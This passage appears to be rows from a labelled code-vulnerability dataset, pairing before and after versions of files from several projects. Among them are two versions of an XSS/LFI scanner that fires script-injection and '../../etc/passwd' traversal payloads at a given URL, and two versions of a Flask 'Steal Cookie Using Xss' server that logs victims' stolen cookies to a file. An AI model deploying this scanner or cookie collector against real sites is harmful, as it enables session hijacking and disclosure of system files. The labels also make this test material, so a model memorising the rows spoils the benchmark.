        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])

    @property
    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))
    async def n_comments(self):
        return await Comment.filter(post_id=self.id).count()

    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
        '{user_id}', '{self.id}'), ONE_HOUR)
    async def comment_ids_liked_by(self, user_id):
        cids = [c.id for c in await self.comments]
        if not cids:
            return []
        queryset = await ReactItem.filter(
            Q(user_id=user_id), Q(target_id__in=cids),
            Q(target_kind=K_COMMENT))
        return [item.target_id for item in queryset]


@comment_reacted.connect
async def update_comment_list_cache(_, user_id, comment_id):
    comment = await Comment.cache(comment_id)
    if comment:
        asyncio.gather(
            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),
            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
                user_id, comment.post_id)),
            return_exceptions=True
        )
/n/n/n",0
89,89,fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d,"/models/comment.py/n/nimport asyncio

import mistune
from tortoise import fields
from tortoise.query_utils import Q
from arq import create_pool

from config import REDIS_URL
from .base import BaseModel
from .mc import cache, clear_mc
from .user import GithubUser
from .consts import K_COMMENT, ONE_HOUR
from .react import ReactMixin, ReactItem
from .signals import comment_reacted
from .utils import RedisSettings

markdown = mistune.Markdown()
MC_KEY_COMMENT_LIST = 'comment:%s:comment_list'
MC_KEY_N_COMMENTS = 'comment:%s:n_comments'
MC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'


class Comment(ReactMixin, BaseModel):
    github_id = fields.IntField()
    post_id = fields.IntField()
    ref_id = fields.IntField(default=0)
    kind = K_COMMENT

    class Meta:
        table = 'comments'

    async def set_content(self, content):
        return await self.set_props_by_key('content', content)

    async def save(self, *args, **kwargs):
        content = kwargs.pop('content', None)
        if content is not None:
            await self.set_content(content)
        return await super().save(*args, **kwargs)

    @property
    async def content(self):
        rv = await self.get_props_by_key('content')
        if rv:
            return rv.decode('utf-8')

    @property
    async def html_content(self):
        content = await self.content
        if not content:
            return ''
        return markdown(content)

    async def clear_mc(self):
        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):
            await clear_mc(key % self.post_id)

    @property
    async def user(self):
        return await GithubUser.get(gid=self.github_id)

    @property
    async def n_likes(self):
        return (await self.stats).love_count


class CommentMixin:
    async def add_comment(self, user_id, content, ref_id=0):
        obj = await Comment.create(github_id=user_id, post_id=self.id,
                                   ref_id=ref_id)
        redis = await create_pool(RedisSettings.from_url(REDIS_URL))
        await asyncio.gather(
            obj.set_content(content),
            redis.enqueue_job('mention_users', self.id, content, user_id),
            return_exceptions=True
        )
        return obj

    async def del_comment(self, user_id, comment_id):
        c = await Comment.get(id=comment_id)
        if c and c.github_id == user_id and c.post_id == self.id:
            await c.delete()
            return True
        return False

    @property
    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))
    async def comments(self):
        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])

    @property
    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))
    async def n_comments(self):
        return await Comment.filter(post_id=self.id).count()

    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
        '{user_id}', '{self.id}'), ONE_HOUR)
    async def comment_ids_liked_by(self, user_id):
        cids = [c.id for c in await self.comments]
        if not cids:
            return []
        queryset = await ReactItem.filter(
            Q(user_id=user_id), Q(target_id__in=cids),
            Q(target_kind=K_COMMENT))
        return [item.target_id for item in queryset]


@comment_reacted.connect
async def update_comment_list_cache(_, user_id, comment_id):
    comment = await Comment.cache(comment_id)
    if comment:
        asyncio.gather(
            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),
            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
                user_id, comment.post_id)),
            return_exceptions=True
        )
/n/n/n",1
78,78,ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e,"readthedocs/search/tests/test_xss.py/n/nimport pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """"""
        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;
        """""".strip()

        hits = results.hits.hits
        assert len(hits) == 1  # there should be only one result

        inner_hits = hits[0]['inner_hits']

        domain_hits = inner_hits['domains']['hits']['hits']
        assert len(domain_hits) == 0  # there shouldn't be any results from domains

        section_hits = inner_hits['sections']['hits']['hits']
        assert len(section_hits) == 1

        section_content_highlight = section_hits[0]['highlight']['sections.content']
        assert len(section_content_highlight) == 1

        assert expected in section_content_highlight[0]
/n/n/n",0
79,79,ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e,"/readthedocs/search/tests/test_xss.py/n/nimport pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """"""
        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;
        """""".strip()

        hits = results.hits.hits
        assert len(hits) == 1  # there should be only one result

        inner_hits = hits[0]['inner_hits']

        domain_hits = inner_hits['domains']['hits']['hits']
        assert len(domain_hits) == 0  # there shouldn't be any results from domains

        section_hits = inner_hits['sections']['hits']['hits']
        assert len(section_hits) == 1

        section_content_highlight = section_hits[0]['highlight']['sections.content']
        assert len(section_content_highlight) == 1

        assert expected in section_content_highlight[0]
/n/n/n",1
52,52,73d12b579a488013c561179bb95b1d45c2b48e2f,"scripts/beaxssf.py/n/n#! python
###############################################
#   BEstAutomaticXSSFinder                    #
#   Author: malwrforensics                    #
#   Contact: malwr at malwrforensics dot com  #
###############################################

import sys
import os
import requests
import re

DEBUG = 0
xss_attacks = [ ""<script>alert(1);</script>"", ""<script>prompt(1)</script>"",
                ""<img src=x onerror=prompt(/test/)>"",
                ""\""><script>alert(1);</script><div id=\""x"", ""</script><script>alert(1);</script>"",
                ""</title><script>alert(1);</script>"", ""<body background=\""javascript:alert(1)\"">"",
                ""<img src=test123456.jpg onerror=alert(1)>""]

lfi_attacks = [
                #linux
                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
                '../../../../../etc/passwd', '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',
                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',
                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',

                #windows
                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',
                '../../../../../boot.ini', '../../../../../../boot.ini',
                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',
                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',
                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',
                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',
                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'
                ]

lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']

def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global xss_attacks
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] XSS check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for xss in xss_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = xss
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        if r.content.find(xss)>=0:
            print ""[+] Target is VULNERABLE""
            print ""Url: "" + url
            print ""Parameters: %s\n"" % str(post_params)

            #comment out the return if you want all the findings
            return
    return

def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global lfi_attacks
    global lfi_expect
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] LFI check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for lfi in lfi_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = lfi
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        for lfi_result in lfi_expect:
            if r.content.find(lfi_result)>=0:
                print ""[+] Target is VULNERABLE""
                print ""Url: "" + url
                print ""Parameters: %s\n"" % str(post_params)

                #comment out the return if you want all the findings
                return
    return


def scan_for_forms(fname, host, url, scanopt):
    print ""[+] Start scan""
    rtype=""""
    has_form=0
    params = []
    hidden_param_name=[]
    hidden_param_value=[]
    page = """"
    form_counter = 0

    try:
        with open(fname, ""r"") as f:
            for line in f:

                #now that we've collected all the parameters
                #let's check if the page is vulnerable
                if line.find(""</form>"") >=0:
                    has_form=0
                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):
                        if scanopt.find(""--checkxss"") == 0 or scanopt.find(""--all"") == 0:
                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        if scanopt.find(""--checklfi"") == 0 or scanopt.find(""--all"") == 0:
                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        params=[]
                        hidden_param_name=[]
                        hidden_param_value=[]
                        page=""""

                #add input parameters to list
                if has_form == 1:
                    m_input = re.match(r'.*\<(input|button)\s[^\>]*name=[""\'](\w+)[""\']', line, re.M|re.I)
                    if m_input:
                        #check if the parameters already has a value assigned
                        m_value = re.match(r'.*\<(input|button)\s[^\>]*value=[""\'](\w+)[""\']', line, re.M|re.I)
                        if m_value:
                            hidden_param_name.append(m_input.group(2))
                            hidden_param_value.append(m_value.group(2))
                        else:
                            params.append(m_input.group(2))

                #detect forms
                m_same      = re.match(r'.*\<form\>', line, re.M|re.I)
                m_action    = re.match(r'.*\<form\s[^\>]*action=[""\']([\w\/\.\-\#\:]+)[""\']', line, re.M|re.I)
                m_reqtype   = re.match(r'.*\<form\s[^\>]*method=[""\']([\w\/\.\-]+)[""\']', line, re.M|re.I)
                if m_action or m_same:
                    has_form=1
                    form_counter+=1
                    if m_same:
                        page=""""
                    else:
                        page=m_action.group(1)
                    rtype=""get""
                    if m_reqtype:
                        rtype=m_reqtype.group(1)
                    print ""[+] Form detected. Method "" + rtype.upper()

    except Exception, e:
        print ""[-] scan_for_forms(): Error "" + str(e)

        #enable the following lines if you want more details
        #exc_type, exc_obj, exc_tb = sys.exc_info()
        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #print(exc_type, fname, exc_tb.tb_lineno)

    return

def help():
    print ""--checkxss\t\tcheck webpage for XSS vunerabilities""
    print ""--checklfi\t\tcheck webpage for local file inclusion (LFI) vulnerabilities""
    print ""--all\t\t\tthe tool will scan for both XSS and LFI vulnerabilities (default)""
    print ""\nExamples:""
    print ""program http://example.com/guestbook\t\t\tit will check for both XSS and LFI""
    print ""program --checkxss http://example.com/guestbook\t\tit will check only for XSS""

###MAIN###
if __name__ == ""__main__"":
    print ""BEstAutomaticXSSFinder v1.0""
    print ""DISCLAIMER: For testing purposes only!\n""

    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print ""program [scan options] [url]\n""
        help()
        exit()

    scanopt =""--all""
    url = """"
    
    if sys.argv[1].find(""http"") == 0:
        url = sys.argv[1]
        if len(sys.argv) == 3:
            scanopt = sys.argv[2]
    else:
        if len(sys.argv) == 3:
            if sys.argv[1].find(""--check"") == 0:
                scanopt = sys.argv[1]
                url = sys.argv[2]

    if url.find(""http"") != 0:
        print ""[-] Invalid target""
        exit()

    m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
    if m:
        host = m.group(2)
    else:
        print ""[-] Can't get host information""
        exit()

    print ""[+] Host acquired "" + host
    print ""[+] Retrieve page""
    try:
        r = requests.get(url)
        s = r.content.replace("">"", "">\n"")

        #good to have a local copy for testing
        with open(""tmpage.txt"", ""w"") as f:
            f.write(s)

        scan_for_forms(""tmpage.txt"", host, url, scanopt)
        if DEBUG == 0:
            os.remove(""tmpage.txt"")
    except Exception, e:
        print ""[-] Main(): Error "" + str(e)

print ""[*] Done""
/n/n/n",0
53,53,73d12b579a488013c561179bb95b1d45c2b48e2f,"/scripts/beaxssf.py/n/n#! python
###############################################
#   BEstAutomaticXSSFinder                    #
#   Author: malwrforensics                    #
#   Contact: malwr at malwrforensics dot com  #
###############################################

import sys
import os
import requests
import re

DEBUG = 0
xss_attacks = [ ""<script>alert(1);</script>"", ""<img src=x onerror=prompt(/test/)>"",
                ""\""><script>alert(1);</script><div id=\""x"", ""</script><script>alert(1);</script>"",
                ""</title><script>alert(1);</script>"", ""<body background=\""javascript:alert(1)\"">"",
                ""<img src=test123456.jpg onerror=alert(1)>""]

lfi_attacks = [
                #linux
                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
                '../../../../../etc/passwd', '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',
                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',
                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',

                #windows
                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',
                '../../../../../boot.ini', '../../../../../../boot.ini',
                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',
                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',
                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',
                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',
                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'
                ]

lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']

def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global xss_attacks
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] XSS check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for xss in xss_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = xss
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        if r.content.find(xss)>=0:
            print ""[+] Target is VULNERABLE""
            print ""Url: "" + url
            print ""Parameters: %s\n"" % str(post_params)

            #comment out the return if you want all the findings
            return
    return

def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global lfi_attacks
    global lfi_expect
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] LFI check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for lfi in lfi_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = lfi
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        for lfi_result in lfi_expect:
            if r.content.find(lfi_result)>=0:
                print ""[+] Target is VULNERABLE""
                print ""Url: "" + url
                print ""Parameters: %s\n"" % str(post_params)

                #comment out the return if you want all the findings
                return
    return


def scan_for_forms(fname, host, url):
    print ""[+] Start scan""
    rtype=""""
    has_form=0
    params = []
    hidden_param_name=[]
    hidden_param_value=[]
    page = """"
    form_counter = 0
    try:
        with open(fname, ""r"") as f:
            for line in f:

                #now that we've collected all the parameters
                #let's check if the page is vulnerable
                if line.find(""</form>"") >=0:
                    has_form=0
                    if len(page) > 0 and len(params) > 0:
                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        params=[]
                        hidden_param_name=[]
                        hidden_param_value=[]
                        page=""""

                #add input parameters to list
                if has_form == 1:
                    m_input = re.match(r'.*\<(input|button)\s[^\>]*name=""(\w+)""', line, re.M|re.I)
                    if m_input:
                        #check if the parameters already has a value assigned
                        m_value = re.match(r'.*\<(input|button)\s[^\>]*value=""(\w+)""', line, re.M|re.I)
                        if m_value:
                            hidden_param_name.append(m_input.group(2))
                            hidden_param_value.append(m_value.group(2))
                        else:
                            params.append(m_input.group(2))

                #detect forms
                m_same      = re.match(r'.*\<form\>""', line, re.M|re.I)
                m_action    = re.match(r'.*\<form\s[^\>]*action=""([\w\/\.\-\#\:]+)""', line, re.M|re.I)
                m_reqtype   = re.match(r'.*\<form\s[^\>]*method=""([\w\/\.\-]+)""', line, re.M|re.I)
                if m_action or m_same:
                    has_form=1
                    form_counter+=1
                    if m_same:
                        page=""""
                    else:
                        page=m_action.group(1)
                    rtype=""get""
                    if m_reqtype:
                        rtype=m_reqtype.group(1)
                    print ""[+] Form detected. Method "" + rtype.upper()

    except Exception, e:
        print ""[-] scan_for_forms(): Error "" + str(e)

        #enable the following lines if you want more details
        #exc_type, exc_obj, exc_tb = sys.exc_info()
        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #print(exc_type, fname, exc_tb.tb_lineno)

    return

def banner():
    print ""BEstAutomaticXSSFinder v1.0""
    print ""DISCLAIMER: For testing purposes only!\n""

###MAIN###
if __name__ == ""__main__"":
    banner()

    if len(sys.argv) != 2:
        print ""program [url]""
        exit()

    url = sys.argv[1]
    if url.find(""http"") != 0:
        print ""[-] Invalid target""
        exit()

    m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
    if m:
        host = m.group(2)
    else:
        print ""[-] Can't get host information""
        exit()

    print ""[+] Host acquired "" + host
    print ""[+] Retrieve page""
    try:
        r = requests.get(url)
        s = r.content.replace("">"", "">\n"")

        #good to have a local copy for testing
        with open(""tmpage.txt"", ""w"") as f:
            f.write(s)

        scan_for_forms(""tmpage.txt"", host, url)
        os.remove(""tmpage.txt"")
    except Exception, e:
        print ""[-] Main(): Error "" + str(e)

print ""[*] Done""
/n/n/n",1
116,116,d20b8de6b838a490155218b2306c87f6060713a6,"xss.py/n/ntry:
	from flask import Flask,request
	from termcolor import colored
	from time import sleep
except:
	print('[!] Install The Modules .. ')
	import os
	os.system('pip install flask')
	os.system('pip install termcolor')
	os.system('pip install time')
	sys.exit()
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",0
117,117,d20b8de6b838a490155218b2306c87f6060713a6,"/xss.py/n/nfrom flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",1
38,38,4e4c209ae3deb4c78bcec89c181516af8604b450,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
